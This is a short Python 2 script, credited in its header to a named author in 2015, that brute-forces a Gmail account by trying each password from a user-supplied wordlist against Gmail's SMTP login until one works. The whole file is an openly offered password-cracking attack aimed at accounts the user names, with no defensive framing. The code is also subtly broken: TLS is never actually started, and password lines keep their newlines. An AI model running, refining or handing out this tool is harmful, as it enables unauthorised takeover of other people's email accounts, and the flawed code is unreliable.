## Brute force email(GMAIL example here) using python, written by
## Tarang Khanna on 27-July-2015

import smtplib # library for email connection, comes with phython 2.7 atleast

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls

username = raw_input("Enter an email address you want to crack: ") # input
passfile = raw_input("Enter the password files name: ") # download a list of passwords
passfile = open(passfile, "r") 

for password in passfile: # iterate through the passcodes in the provided file and try each
	try:
		smtpserver.login(username, password)
		print "Pass found and is: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "This pass is incorrect: %s" % password